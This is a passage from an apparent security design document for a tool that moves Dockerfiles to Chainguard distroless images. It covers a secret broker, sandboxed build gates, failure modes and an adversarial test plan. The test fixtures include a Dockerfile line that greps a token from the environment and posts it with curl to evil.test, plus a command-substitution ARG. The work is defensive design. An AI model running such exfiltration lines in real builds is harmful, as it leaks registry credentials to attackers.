│    4. cosign verify cgr.dev/chainguard/<base>@<digest> against policy    │
│    5. docker buildx build --no-cache --builder=ephemeral                 │
│    6. dive --json image_post → static_shell_binary_count                 │
│    7. ChainguardImageRunner exec image_post                              │
│       --read-only --network=none(virt) --tmpfs /tmp                      │
│       --user nobody:nobody --cap-drop=ALL --pids-limit=64                │
│    8. host-side eBPF trace observes the runner                           │
│    9. emit /work/objective-signals.json (extended schema)                │
│                                                                          │
│  egress proxy (Phase 5 in-VM proxy, extended config):                    │
│    + Chainguard token injection on cgr.dev/v2/chainguard/* OCI paths     │
│    + per-domain byte cap accounting                                      │
│    + drops unrecognized cgr.dev paths with audit event                   │
│                                                                          │
│  lifetime: ≤10 min wall-clock (was 5 min in Phase 5 for vuln gate)       │
│  destroy: SIGKILL + microVM destroy + token revoke                       │
└────────────────────┬────────────────────────────────────────────────────┘
                     │ Phase 5 callback (one-time token, HMAC envelope, unchanged)
                     ▼
┌─────────────────────────────────────────────────────────────────────────┐
│ GATE-CONTROL receives signals → computes verdict (Phase 5 scorer +       │
│   MigrationSignalScorer additive) → BLAKE3 chain extend → return to     │
│   orchestrator via Phase 5 RPC. ChainguardTokenMinter.revoke(mint_id).  │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## Components

### `BaseImageProbe` (NEW, gather-time)
- **Purpose:** Detect the base image(s) referenced in the target repo's Dockerfile(s). Pure read; reports the `FROM` references, multi-stage aliases, and any image digests (`@sha256:...`) found. Output is **evidence**, not judgment.
- **Trust level:** trusted (deterministic Python, runs in the gatherer process).
- **Interface:** Satisfies the Phase-2 `Probe` ABC unmodified. `declared_inputs = ["**/Dockerfile", "**/Dockerfile.*", "**/*.dockerfile"]`. `applies_to_tasks = ["distroless"]`. `applies_to_languages = ["*"]`. `applies_to_lifecycle = ["gather"]` (new field, defaults to `["gather"]` for backward compat).
- **Isolation:** runs inside the existing Phase-2 subprocess sandbox profile (no network, env stripped). `dockerfile-parse` runs as a subprocess with 10s wall-clock + 1 MB input cap.
- **Credentials accessed:** none. No registry contact at gather time.
- **Audit emissions:** `probe.executed` (Phase 2 event, unchanged); `dockerfile.parse_rejected` if any Dockerfile fails the safety checks (probe records evidence-of-rejection but does not fail the gather).
- **Tradeoffs accepted:** A repo with an unparseable Dockerfile gets a `base_image: null, reason: parse_rejected` slice; the Migration Subgraph treats this as a human-escalation event rather than a gate failure. We trade migration coverage for safety.

### `ShellInvocationTraceProbe` (NEW, gate-time)
- **Purpose:** Count the number of shell invocations the candidate (post-migration) image performs at startup. Two outputs: `runtime_shell_count` (from eBPF trace of the running container) and `static_shell_binary_count` (from `dive` layer inspection).
- **Trust level:** trusted-as-a-component, but its workload is **untrusted** (it runs the candidate image's entrypoint).
- **Interface:** Satisfies the Phase-2 `Probe` ABC. `applies_to_lifecycle = ["gate"]`. The coordinator's contract is extended (additively) to refuse `gate`-lifecycle probes at gather time — gate-time probes are dispatched from gate-control via the Phase-5 microVM contract, not from the Phase-2 coordinator. **Adversarial input:** the candidate image is attacker-influenceable (recipe-produced, possibly LLM-produced on retry-2).
- **Isolation:** runs inside the Phase-5 microVM. The image-runner inside the microVM uses `--read-only --network=none(virt) --tmpfs /tmp --user nobody:nobody --cap-drop=ALL --pids-limit=64 --memory=512m --cpus=1`. The eBPF tracer runs on the *host* side of the microVM and is read-only.
- **Credentials accessed:** none (the image is already pulled; the entrypoint runner has no env, no host mounts, no docker socket).
- **Audit emissions:** `migration.shell_invocation_trace_completed` with both counts and the trace digest.
- **Tradeoffs accepted:** A 30s wall-clock on entrypoint observation may be too short for some images that legitimately "warm up" before showing zero shell invocations. We accept the false-positive rate and surface `entrypoint_timeout: true` for human review. A configurable per-image timeout under `migration/timeouts.yaml` (digest-pinned) is the synth's call.

### `DistrolessMigrationRecipe` (NEW)
- **Purpose:** The deterministic recipe that swaps a known parent image for its Chainguard distroless equivalent, refactors multi-stage builds, and removes superfluous `RUN apk/apt`/`USER`/`SHELL`/`HEALTHCHECK` directives per the playbook.
- **Trust level:** trusted as code (lives under `recipes/distroless/`, pinned by SHA-256 in `recipes/digests.yaml` extending Phase 3's pattern).
- **Interface:** pure function `(RepoContext, CveImageMap, Dockerfile_AST) -> Dockerfile_AST'`. No I/O. Tested against the adversarial-Dockerfile corpus. **Adversarial input:** the input Dockerfile AST is attacker-controlled (the repo's own Dockerfile); the recipe must produce safe output or refuse.
- **Isolation:** runs in-process inside `apply_dockerfile_patch` (which itself runs in the orchestrator's Python process). Refuses if the input AST contains `ONBUILD`, mid-Dockerfile network-substituting `ARG`, or `FROM scratch` (we don't migrate from scratch). Refuses if the resulting `FROM` reference doesn't match the Chainguard allowlist regex.
- **Credentials accessed:** none.
- **Audit emissions:** `dockerfile.recipe_applied` with pre/post digests and AST-equivalence round-trip flag.
- **Tradeoffs accepted:** the recipe's allowlist refuses some legitimate but unusual Dockerfile patterns. Operators may escalate to human review or to retry-2 LLM fallback.

### `ChainguardTokenMinter` (NEW, in gate-control)
- **Purpose:** The only component that converts the per-host Chainguard handle into a short-TTL pull token, and the only component that injects that token into a microVM.
- **Trust level:** semi-trusted (gate-control daemon; separate Unix user; Phase 5 confinement applies unchanged).
- **Interface:** `mint(workflow_id, gate_id, image_ref) -> ScopedToken`; `revoke(mint_id) -> None`. Talks to `codegenie-secretd` over AF_UNIX with the gate-control HMAC envelope. **Adversarial input:** none — gate-control calls it from controlled paths only.
- **Isolation:** lives in gate-control's process; tokens live in memory only; serialized to the microVM's in-guest egress-proxy keyring at boot via the existing Phase-5 copy-in mechanism (no host filesystem persistence).
- **Credentials accessed:** the short-TTL token from the broker. NEVER reads the long-lived Chainguard refresh credential. NEVER stores tokens to disk.
- **Audit emissions:** `chainguard.token.minted` + `chainguard.token.revoked` per gate.
- **Tradeoffs accepted:** rate limits (6/min/workflow, 60/hr/host) may throttle retries; the orchestrator's retry loop is aware and surfaces "rate-limited; retrying with backoff" rather than failing.

### `SecretBroker` (NEW per-host daemon, `codegenie-secretd`)
- **Purpose:** The only process on the host that ever reads the long-lived Chainguard refresh credential. Mints short-TTL pull tokens on demand.
- **Trust level:** semi-trusted; runs as its own Unix user (`codegenie-secret`); systemd `ProtectSystem=strict`, `NoNewPrivileges=true`, `MemoryDenyWriteExecute=true`, `LockPersonality=true`, `RestrictAddressFamilies=AF_UNIX AF_INET6`.
- **Interface:** AF_UNIX server at `/var/run/codegenie/secretd.sock` (0660, group `codegenie-gate`). Accepts only HMAC-signed envelopes from gate-control's per-process key.
- **Isolation:** the only writer of the at-rest encrypted credential file (`/etc/codegenie/secrets/chainguard.age` or OS keychain entry).
- **Credentials accessed:** the long-lived Chainguard refresh credential (decrypts at startup, holds in memory). Nothing else.
- **Audit emissions:** every mint + revoke recorded into a *separate* BLAKE3 chain `audit/secretd.jsonl` (the broker's chain is independent of the orchestrator's chain; both are tamper-evident; investigators cross-check them).
- **Tradeoffs accepted:** a separate daemon adds operational complexity; the gain is that an orchestrator memory dump never contains Chainguard credentials. The broker is small enough (≤500 LoC) that a security review is tractable.

### `MigrationSignalScorer` (NEW, in gate-control)
- **Purpose:** Register the new strict-AND signals from goal 10 into the Phase-5 `TrustGate` scorer additively. Does not modify Phase-5 scorer code.
- **Trust level:** semi-trusted (gate-control).
- **Interface:** at gate-control startup, calls `TrustGate.register_signal("shell_invocation_count", schema_field=..., predicate=lambda v: v == 0)` for each new signal. The scorer iterates the registered set; absence of a registered signal in the payload (e.g., a vuln gate with no migration fields) is handled by the Phase-5 default (the signal is treated as `not_applicable`, which short-circuits to `pass` for that signal). The "not applicable means pass" rule already exists in Phase 5 for per-task-class signal sets.
- **Isolation:** in-process to gate-control; no separate boundary.
- **Credentials accessed:** none.
- **Audit emissions:** the signal value goes into `gate.evaluation.completed` (Phase 5 event, unchanged).
- **Tradeoffs accepted:** the "not applicable means pass" rule is a place where a future task class could accidentally weaken the scorer. The synth should consider whether Phase 7 also lands an explicit per-task-class `required_signals` set (a future-Phase-7+ tightening).

### `DockerfilePatcher` (NEW, in-process)
- **Purpose:** Apply the recipe's AST mutation, serialize, re-parse, assert round-trip equivalence, and write the diff to `.codegenie/patches/<wf>/Dockerfile.diff`. Refuses non-equivalent round-trips.
- **Trust level:** semi-trusted (runs in orchestrator process; only mutates an in-process AST; final output is text-only).
- **Interface:** `patch(pre_ast, recipe_output_ast) -> PatchResult`. Uses `dockerfile-parse` in strict mode. **Adversarial input:** the recipe output AST (recipe is trusted code) — but the input Dockerfile AST that produced it is attacker-controlled, so the recipe's output may carry attacker structure forward.
- **Isolation:** runs in-process. The `dockerfile-parse` library is digest-pinned. Any parse exception is caught and reported as `dockerfile.parse_rejected`.
- **Credentials accessed:** none.
- **Audit emissions:** `dockerfile.recipe_applied` on success; `dockerfile.parse_rejected` on failure.
- **Tradeoffs accepted:** a strict round-trip equivalence check rejects some legitimate but ambiguous Dockerfile patterns (whitespace-significant heredocs, multi-line `RUN` continuations the parser canonicalizes). Operators escalate to human review.

### `CveImageMapIngester` (NEW, one-shot ceremony)
- **Purpose:** Ingest `tools/cve-image-map.yaml` + `tools/cve-image-map.yaml.sig` into the content-addressed local snapshot store at `.codegenie/feeds/cve-image-map/<digest>.yaml`. Verifies the Chainguard publisher signature against `tools/chainguard-publisher.pub`.
- **Trust level:** trusted (one-shot, audited, operator-invoked).
- **Interface:** `codegenie cve-image-map fetch` (CLI, separate command, like Phase 3's NVD ingest). Refuses if the signature doesn't verify, if the snapshot's claimed date is older than the currently-pinned one (downgrade attack), or if any value in the map fails the Chainguard image-name regex.
- **Isolation:** runs in the Phase-2 subprocess sandbox; no host home; network egress allowlist for `chainguard.dev` only.
- **Credentials accessed:** none (the publisher key is a public verification key, committed to the repo).
- **Audit emissions:** `cve_image_map.fetched`, `cve_image_map.signature_verified`, `cve_image_map.signature_rejected`, `cve_image_map.downgrade_rejected`.
- **Tradeoffs accepted:** automated bumping is deferred to Phase 16. Operators must run the ingest manually on each upstream snapshot release.

### Carried-forward components (unchanged in Phase 7)

- **TrustGate (orchestrator-side RPC client)** — [Phase 5](../05-sandbox-trust-gates/design-security.md). Phase 7 adds new fields to `GateRequest` and `GateResult` via Pydantic model extension under `migration/state.py`; the existing Phase-5 schemas are untouched.
- **Gate-control daemon (`codegenie-gated`)** — [Phase 5](../05-sandbox-trust-gates/design-security.md). Phase 7 adds the `ChainguardTokenMinter` and `MigrationSignalScorer` as new files; the daemon's main loop is unchanged.
- **Stack adapters (Firecracker / gVisor / legacy Docker)** — [Phase 5](../05-sandbox-trust-gates/design-security.md). Phase 7 bumps the rootfs digest to ship the new tools; no adapter code changes.
- **Audit chain** — [Phase 5 + 6](../06-sherpa-state-machine/design-security.md). Phase 7 adds new event types; the chain format and BLAKE3-linking are unchanged.
- **LangGraph runtime + SqliteSaver checkpointer** — [Phase 6](../06-sherpa-state-machine/design-security.md). Phase 7 adds a new subgraph; `LoopState` is extended additively under `migration/state.py` (the synth must confirm whether this is acceptable in Phase 6's schema model or whether the Migration Subgraph carries its own `MigrationLoopState` composed into the parent state).

---

## Data flow

A representative end-to-end run on a distroless migration that passes the gate on the first attempt.

1. **Workflow start.** Operator runs `codegenie migrate <repo> --task distroless`. The Phase-6 Supervisor routes to the Migration Subgraph based on `state.task_class = "distroless"`. **Trust boundary crossing:** the repo's Dockerfile bytes enter the orchestrator; treat as untrusted from this point.
2. **Gather check.** The orchestrator confirms `RepoContext` is fresh (Phase 2 + 14 path; for the local POC, runs `codegenie gather` synchronously). The `BaseImageProbe` slice is read from `RepoContext`: `base_image_pre = "node:20.10.0-bullseye"`, `dockerfile_path = "Dockerfile"`, `dockerfile_digest_pre = blake3(...)`.
3. **Plan distroless recipe.** Pure function `plan_distroless_recipe(state, cve_image_map_digest)`. Looks up `node:20.10.0-bullseye` in the signature-verified CVE-image map snapshot. Map says: `cgr.dev/chainguard/node:20-distroless@sha256:<pinned>`. The image-name regex passes. The Levenshtein distance check vs the prior name (`node:20.10.0-bullseye` → `cgr.dev/chainguard/node:20-distroless`) is large but expected (the prefix is allowlisted). Returns `RecipeChoice(recipe_id="distroless.node.multi-stage-bullseye-to-cgr", target_image="cgr.dev/chainguard/node:20-distroless@sha256:<pinned>")`. **No LLM.**
4. **Apply Dockerfile patch.** `apply_dockerfile_patch` runs the `DistrolessMigrationRecipe` in-process. Parses the input Dockerfile in strict mode (UTF-8, no BOM, LF, ≤1 MB, ≤10s — passes). Applies the AST mutation: rewrites the `FROM` reference, removes a now-orphan `RUN apt-get install -y curl`, restructures the multi-stage to copy `node_modules` into the distroless final stage. Serializes the AST', re-parses, asserts round-trip equivalence — passes. Writes `.codegenie/patches/<wf>/Dockerfile.diff`. Audit event `dockerfile.recipe_applied` written with `ast_round_trip_ok=true`.
5. **Validate distroless gate.** `validate_distroless_gate` calls `TrustGate.evaluate(GateRequest(patch_path, snapshot_path, test_inventory_digest, workflow_id, retry_count=0, task_class="distroless"))`. **Trust boundary crossing:** the patch + snapshot move from orchestrator to gate-control over the Phase-5 AF_UNIX RPC, HMAC-signed envelope.
6. **Gate-control receives.** Validates the HMAC. Mints a one-time gate-callback token (Phase 5 unchanged). Calls `ChainguardTokenMinter.mint(workflow_id, gate_id, "cgr.dev/chainguard/node")` → talks to the Secret Broker over AF_UNIX, receives a 10-min TTL pull token, mints a `mint_id`, emits `chainguard.token.minted` audit event.
7. **microVM boot.** Phase-5 microVM allocator boots a fresh microVM at the *new* rootfs digest (which ships buildx, dive, dockerfile-parse, cosign, image-runner). Copy-in includes `Dockerfile.patch`, `cve-image-map.snapshot.yaml`, `cosign-policy.yaml`. The in-VM egress proxy is initialized with the Chainguard token in its keyring (not in the workload env).
8. **In-VM workload.** `dockerfile-parse Dockerfile_pre`; apply recipe (already applied at orchestrator-side but re-verified here for defense-in-depth); round-trip check passes. `cosign verify cgr.dev/chainguard/node@<digest>` succeeds against the pinned issuer/identity policy — `image.signature.verified` audit event written. `docker buildx build --no-cache --builder=ephemeral` produces `image_post`. `dive --json image_post` reports `static_shell_binary_count=0`. `ChainguardImageRunner exec image_post --read-only --network=none(virt) ...` runs the entrypoint for ≤30 seconds; the eBPF trace on the host side counts `runtime_shell_count=0` and `runtime_egress_endpoint_count=0`. In-VM init constructs `ObjectiveSignals_distroless` with all new fields set, signs it, callback POSTs to gate-control.
9. **microVM destroy.** Phase-5 destroy path. `ChainguardTokenMinter.revoke(mint_id)` runs as part of teardown; `chainguard.token.revoked` audit event written.
10. **Verdict.** Gate-control runs the Phase-5 scorer plus the `MigrationSignalScorer`-registered signals. All eight base signals + six new migration signals evaluate `true`. `verdict = pass`. `gate.evaluation.completed` audit event written with the extended signal payload.
11. **Return to orchestrator.** `GateResult(verdict="pass", retry_count=0, audit_entry_hash=..., migration_signals={...})`. The Phase-6 `record_distroless_verdict` reducer writes the new fields under their ACLs. The Migration Subgraph transitions to `finalize_pass`. Per [ADR-0009](../../production/adrs/0009-humans-always-merge.md), the workflow terminates with a patch ready for human review at PR opening (Phase 11).

**Credential minting / use / revocation summary (additive over Phase 5):**
- **Chainguard pull token** — minted by `ChainguardTokenMinter` from the Secret Broker at gate start; TTL ≤10 min; injected into the microVM's in-VM egress proxy keyring (not into the workload env); revoked on microVM destroy. The token never enters the orchestrator address space; never enters the workload's env; never persists to disk.
- **Chainguard refresh credential** — long-lived, lives only in the Secret Broker's address space; on disk only as `age`-encrypted file or OS-keychain entry; never returned over the broker's AF_UNIX socket.
- **`tools/chainguard-publisher.pub`** — public key, committed to the repo, no secret material.

---

## Failure modes & recovery

| Failure | Detected by | Containment | Recovery |
|---|---|---|---|
| Hostile Dockerfile fails strict UTF-8 / BOM / CR / size / `ONBUILD` checks | `DockerfilePatcher` raises `DockerfileRejected`; audit event `dockerfile.parse_rejected` with reason code | Recipe is not applied; no microVM is started; no token is minted | The Migration Subgraph routes directly to `await_human_review` with the reason code; operator inspects |
| `dockerfile-parse` hangs or RCEs on adversarial input | 10-second wall-clock kills the parser subprocess; the orchestrator does not deserialize parser output that arrived after the deadline | Parser runs as a *subprocess* (or inside the microVM on retry); no orchestrator process state corruption | `dockerfile.parse_rejected` with `reason=timeout`; escalate; `dockerfile-parse` digest bumped on next upstream patch |
| Recipe produces a Dockerfile whose round-trip parse differs from the AST it serialized | `DockerfilePatcher.patch()` asserts `parse(serialize(AST')) == AST'`; raises `RoundTripFailure` | No patch is written; no gate is run | Audit `dockerfile.recipe_applied(ast_round_trip_ok=false)`; subgraph routes to `await_human_review` (retries here would reproduce; this is a recipe bug, not a transient failure) |
| CVE-to-image map record poisoned to a typosquat (`cgr.dev/chamguard/...`) | Allowlist regex `^cgr\.dev/chainguard/[a-z0-9-]+(@sha256:[a-f0-9]{64}\|:[a-z0-9._-]+)$` rejects; OR cosign verify against the Chainguard issuer regex fails inside the microVM | No image is pulled until the regex passes; no image is built until cosign verifies | `image.signature.invalid` or `cve_image_map.allowlist_rejected` audit; gate fails; subgraph retries via LLM fallback (which faces the same allowlist + cosign gates); escalates at retry-3 |
| CVE-to-image map snapshot is replayed (downgrade attack) | `CveImageMapIngester` rejects a snapshot whose claimed date is older than the currently-pinned one | Ingest aborts; previous snapshot remains in effect | `cve_image_map.downgrade_rejected` audit event; operator investigates the upstream publisher |
| Chainguard publisher signature invalid on map ingest | `CveImageMapIngester` verifies against `tools/chainguard-publisher.pub`; rejects | Ingest aborts; previous snapshot remains in effect | `cve_image_map.signature_rejected`; operator confirms with Chainguard out-of-band |
| Build-time code execution attempts egress to non-allowlisted endpoint | In-VM egress proxy drops; host-level firewall on the microVM tap also drops (defense-in-depth from Phase 5); `sandbox.egress.blocked` audit event | Build fails or hangs; wall-clock kills the microVM | Gate.fail; retry feedback shows the LLM the blocked endpoint; pattern repeats → escalate |
| Build-time code attempts to extract Chainguard token | The token is not in the build environment; the proxy injects on outbound requests only; an in-VM workload cannot read the proxy's keyring (the proxy runs as a different uid in the VM, like Phase 5's init/workload split) | The workload sees no token to extract | If the workload reads the proxy keyring via a kernel exploit, the Phase-5 microVM boundary is breached — that's a sandbox-escape failure, handled per Phase 5 |
| Migrated image still has `/bin/sh` in its layers | `dive --json` finds the binary; `static_shell_binary_count > 0`; strict-AND fails | Gate.fail; verdict reported with the failing signal | Retry-1: recipe parameter sweep (e.g., remove the offending `COPY --from=builder` line); retry-2: LLM fallback; retry-3: escalate |
| Migrated image entrypoint invokes a shell at runtime | eBPF trace counts `execve("/bin/sh", ...)`; `runtime_shell_count > 0` | Gate.fail | Same retry path |
| Migrated image entrypoint hangs (never exits, never prints "ready") | 30s wall-clock on the runner; eBPF trace coverage check fires `runtime_trace.entrypoint_timeout=true` | The runner is SIGKILLed; the microVM is destroyed | Gate.fail with `entrypoint_timeout`; escalate (a hanging entrypoint is often a sign of legitimate startup waiting for a service the runner can't see) |
| `dive` exploited by a malicious image layer | `dive` runs *inside* the microVM, never on the orchestrator host; even an RCE in `dive` is confined to the microVM | The microVM is destroyed at gate end regardless | Audit chain records `dive` exit code; on suspicious exit code, the gate fails; CI bumps `tools/digests.yaml#sandbox.dive` |
| Chainguard token revoke RPC fails after gate end | The Secret Broker also enforces a hard TTL on the token (≤10 min); revoke is best-effort | Token expires anyway | `chainguard.token.revoke_failed` audit; the broker auto-expires |
| Secret Broker compromised | The broker is the smallest attack surface (≤500 LoC; no LLM; no network egress except AF_UNIX to gate-control); a compromise exposes the Chainguard refresh credential | Worst case: an attacker who already has the broker has the refresh credential | Rotate the Chainguard refresh credential out-of-band; the broker's audit chain (`audit/secretd.jsonl`) shows the mint history for post-hoc investigation |
| Operator passes `--allow-unsigned-images` or `--skip-cosign-verify` | The flags don't exist — the CLI parser refuses them | N/A | N/A |
| Operator passes `--unsafe-shell-presence-ok` | Audit event `gate.unsafe_mode(flag="unsafe-shell-presence-ok")`; the gate result carries `unsafe_mode=true`; Phase 11 PR-opening logic refuses to auto-open | Explicit operator opt-in; warning on every gate; cannot persist beyond the workflow | If the operator confirms manually, the PR is opened with a prominent banner that the migration was passed under unsafe mode |
| Extension-by-addition violation (someone edits a Phase 0–6 file) | CI test compares `tools/phase-frozen-digests.yaml` against the BLAKE3 of every Phase 0–6 source file | The PR fails CI with a clear message pointing at ADR-0028 | The contributor either reverts the change (and finds another way to implement the addition) or amends ADR-0028 in the same PR; security review is mandatory on any frozen-file change |
| Carried forward from Phase 5: sandbox escape, credential exfil, prompt injection, lockfile poisoning, build-cache poisoning | [Phase 5](../05-sandbox-trust-gates/design-security.md) detections and containments apply unchanged | unchanged | unchanged |

---

## Resource & cost profile

- **microVM rootfs size.** Phase 7 rootfs grows from Phase 5's ~250 MB to ~600 MB (buildx is large; dive ~30 MB; dockerfile-parse + Python deps ~50 MB; cosign ~80 MB; the image-runner is ~10 MB). Acceptable for cold-start (Firecracker boots a 600 MB rootfs in ~250ms vs the 150ms cited in Phase 5; gVisor on Lima boots in ~2s vs 1.5s).
- **Gate wall-clock.** Phase 5 vuln gate p95: ~200s. Phase 7 distroless gate p95: ~400s (extra: `cosign verify` ~5s; `docker buildx build` ~120s for a Node app; `dive --json` ~10s; image-runner ≤30s; trace finalization ~5s). Hard wall-clock cap raised from 5 min to 10 min for migration gates only.
- **Chainguard egress.** Per-gate base-image pull ~150-300 MB (a Chainguard distroless Node image). The per-gate cap is raised to 500 MB; the per-domain accounting catches a single bad gate that pulls way more.
- **Audit-chain growth.** Phase 7 adds ~6 new event types × ~3 gates per migration workflow = ~18 extra entries per workflow at ~1 KB each = ~18 KB. Linear, manageable.
- **Secret Broker compute footprint.** Idle: ~10 MB RSS. Per mint: <1 ms. Negligible.
- **Cost of security (vs the alternative).** The alternative is "run buildx on the orchestrator host with the operator's docker daemon and the operator's Chainguard token in `~/.docker/config.json`." That alternative is what every CI pipeline in the industry already does — and it's exactly the supply-chain attack surface this phase exists to close. The cost of the secure path is: ~250ms extra cold start, ~600 MB rootfs disk, one extra daemon process (`codegenie-secretd`), and a one-time CVE-image-map ingest ceremony. **That cost is the price of admission for a system that mutates Dockerfiles across a portfolio.**

---

## Test plan

**Functional (the exit criteria).**
- **E2E migration of a vulnerable Node.js service.** Fixture repo with `FROM node:20.10.0-bullseye` and a known `CVE-2024-XXXXX in node:20`. Run `codegenie migrate <fixture> --task distroless`. Assert: gate.pass; the produced patch rewrites `FROM` to `cgr.dev/chainguard/node:20-distroless@sha256:<pinned>`; `static_shell_binary_count == 0`; `runtime_shell_count == 0`; image signature verified.
- **Vuln regression — full Phase 3+4+5+6 suite runs unchanged.** A CI matrix job runs the entire vuln-remediation regression suite from Phases 3–6 against `HEAD` and asserts zero behavioral change. Per the roadmap, this is a **hard gate** before merging Phase 7.
- **Extension-by-addition assertion.** CI test computes BLAKE3 of every Phase 0–6 source file under `src/codegenie/{loop,sandbox,gate,fallback,probes/{A..G},audit,state}/` and compares against `tools/phase-frozen-digests.yaml`. Any drift fails CI. The PR's diff is rendered with file-by-file annotations: `[FROZEN — ADR-0028]` next to any change in those paths.
- **`tools/digests.yaml` additive-only test.** Parse the YAML at the PR's base and head; assert every key present at base is unchanged at head; only new keys may appear.

**Schema enforcement.**
- Pydantic introspection on `MigrationGateRequest` and `MigrationObjectiveSignals`: no field named `confidence`, `llm`, `self_reported`, `model_says`; locks in [ADR-0008](../../production/adrs/0008-objective-signal-trust-score.md).
- All new audit event types declared in `audit/events/migration.py` (a new file) and registered via `@register_event` so the schema CI test discovers them automatically.

**Adversarial / negative.**
- *Adversarial-Dockerfile corpus.* ≥30 fixtures: BOM-prefixed, UTF-16 encoded, CR line endings, `ONBUILD` present, mid-Dockerfile `ARG x=$(curl atk)`, deeply-nested heredocs, 2 MB file size, parse-bomb (recursive `FROM ... AS ...` chains), unicode normalization attacks, hidden `\r` in `FROM` line, Windows-1252 encoded `FROM` line. Assert: every one either parses to a clean AST or is rejected with the expected `dockerfile.parse_rejected` reason code. **No fixture may be applied a recipe to.**
- *Image-name typosquat.* Fixture map record `CVE-XXX → cgr.dev/chamguard/node:20`. Assert: allowlist regex rejects; `cve_image_map.allowlist_rejected`. Gate is not reached.
- *Image-signature invalid.* Pre-stage a tampered image manifest at a test registry; cosign verify fails. Assert: `image.signature.invalid` audit event; gate.fail; no patch is finalized.
- *Build-time egress to non-allowlisted endpoint.* Fixture Dockerfile contains `RUN curl https://evil.test/`. Assert: in-VM egress proxy drops; `sandbox.egress.blocked` event; build fails as expected; verdict.fail.
- *Build-time exfil of `CHAINGUARD_TOKEN`.* Fixture Dockerfile contains `RUN env | grep CHAINGUARD > /tmp/leak && curl --data-binary @/tmp/leak https://evil.test/`. Assert: the token is not in the env (so `grep` finds nothing); the egress is dropped anyway.
- *Migrated image with static `/bin/sh`.* Fixture Dockerfile multi-stage `COPY --from=builder /bin/sh /bin/sh` to the final distroless stage. Assert: `dive --json` reports `static_shell_binary_count > 0`; gate.fail.
- *Migrated image with runtime shell invocation.* Fixture entrypoint script `#!/bin/sh\nexec node app.js`. Assert: eBPF trace records `execve("/bin/sh", ...)`; `runtime_shell_count > 0`; gate.fail.
- *Migrated image entrypoint hangs.* Fixture entrypoint `while true; do sleep 1; done`. Assert: 30s wall-clock; runner SIGKILLed; `entrypoint_timeout: true`; gate.fail.
- *`dive` crash on a malicious layer.* Fixture image with a 10 GB sparse-but-claims-small layer. Assert: `dive` exits non-zero; gate.fail; no orchestrator process state corruption.
- *Chainguard token rate-limit.* Fire 10 mint requests in 1 second from the same workflow. Assert: the broker returns `rate_limited` after 6; the orchestrator surfaces "rate-limited; backing off" rather than failing.
- *Secret Broker tamper.* Edit `audit/secretd.jsonl` to drop one mint event. Restart the broker. Assert: chain verification fails at startup; broker refuses to serve.
- *Operator passes `--unsafe-shell-presence-ok`.* Assert: every Phase-7 gate result carries `unsafe_mode=true`; downstream phases treat as untrusted.
- *CVE-image-map snapshot replay.* Replace the current snapshot with an older one. Assert: `CveImageMapIngester` rejects; `cve_image_map.downgrade_rejected`; current snapshot unchanged.
- *Frozen-file edit attempt.* Open a PR that adds a single character to `src/codegenie/loop/state.py`. Assert: CI fails with the ADR-0028 message.

**Supply chain.**
- Digest-pinning CI gate: any commit that changes `tools/digests.yaml` for `sandbox.buildx`, `sandbox.dive`, `sandbox.dockerfile-parse`, `sandbox.cosign`, `sandbox.image-runner`, or any `cgr.dev/...` entry requires an `adr-amend` label or fails CI.
- Rootfs build provenance test: build the new (Phase 7) rootfs in CI; assert its digest matches the pinned value; assert it ships exactly the expected tool digests.
- `tools/chainguard-publisher.pub` is checked in and integrity-checked (the file's own BLAKE3 is in `tools/digests.yaml`).

---

## Risks (top 5)

1. **The Chainguard refresh credential is the highest-value secret the system has held to date.** A compromise of the Secret Broker or its on-disk encrypted credential is portfolio-grade. Mitigations: minimal broker LoC; `age`-encryption-at-rest or OS keychain; systemd confinement; separate Unix user; tamper-evident audit; rate limits at the broker. Residual risk: a host kernel exploit gives the broker's memory to the attacker. Recommendation: in [Phase 16 hardening](../../roadmap.md), move the broker to a TEE (SGX/SEV) or to a per-workflow ephemeral KMS-leased credential.

2. **`docker buildx` is a large, complex, frequently-updated dependency inside the rootfs.** Every buildx release is a new CVE surface. Mitigation: `tools/digests.yaml#sandbox.buildx` digest-pinned and bumped on each upstream release with a security-review checklist; 7-day patch SLA continues from Phase 5; the buildx process runs inside the microVM, so a buildx CVE that achieves RCE is confined.

3. **Adversarial Dockerfiles in the wild may have patterns the corpus didn't anticipate.** The 30-fixture corpus is a floor, not a ceiling. Mitigation: every `dockerfile.parse_rejected` event in production becomes a new test fixture (via Phase 7 Stage 7 Learning loop, which lands in Phase 11; for Phase 7 local-only, a `codegenie corpus add-rejected <wf>` CLI puts the rejected Dockerfile under `tests/adversarial/dockerfiles/discovered/`). The synth should consider whether Phase 7 ships this loop or whether it waits for Phase 11.

4. **Image-signature verification depends on Chainguard's OIDC root-of-trust remaining honest.** If Chainguard's signing infrastructure is compromised, an attacker can produce a "verified" malicious image. Mitigation: cosign policy pins both the issuer and the certificate-identity regex; the Chainguard public key in the repo is checked at every ingest; the synth should consider whether Phase 7 should also enforce a *transparency log* check (Sigstore rekor) against tampered signature replays. I argue yes; a rekor lookup is a small addition.

5. **Extension-by-addition could be silently violated in subtle ways the BLAKE3 file-frozen check doesn't catch.** A new probe could declare `applies_to_lifecycle = ["gather", "gate"]` and force the Phase-2 coordinator to "schedule gate-lifecycle probes at gather time" — that's a contract change masquerading as an additive field. Mitigation: a separate CI test asserts the union of `applies_to_lifecycle` values across all gather-time-registered probes is exactly `{"gather"}`; any other value fails CI even if no Phase 0–6 file changed. The synth should consider broadening this to a generalized "contract surface is byte-stable" check.

---

## Acknowledged blind spots

- **Throughput.** Phase 7 inherits Phase 5's per-gate-fresh-microVM rule. Phase 8+ will need a pool, and pool reuse interacts with the Chainguard token's TTL (a warm pool that holds a stale token is broken). Synth should flag for Phase 8.
- **Cross-task-class interaction.** A workflow that is *both* a vuln remediation and a distroless migration (i.e., the migration itself fixes a CVE) runs as two sequential workflows in Phase 7. A future phase may want a combined subgraph; the contract surface as designed supports this, but the audit semantics ("this CVE was fixed by a base-image bump, not a package bump") need a new event type. Out of scope for Phase 7.
- **`ShellInvocationTraceProbe` false-positive rate on legitimate-but-unusual entrypoints.** Some images legitimately invoke shell (e.g., `init` containers, debug builds). The 30s wall-clock and the strict-AND on `runtime_shell_count == 0` is a hard line. The synth should consider whether Phase 7 should support a per-image opt-out (a `.codegenie/migration/allowed-shell-invocations.yaml` allowlist) — I argue no for Phase 7 (it weakens the gate's intent) and yes for Phase 16 (with strong audit).
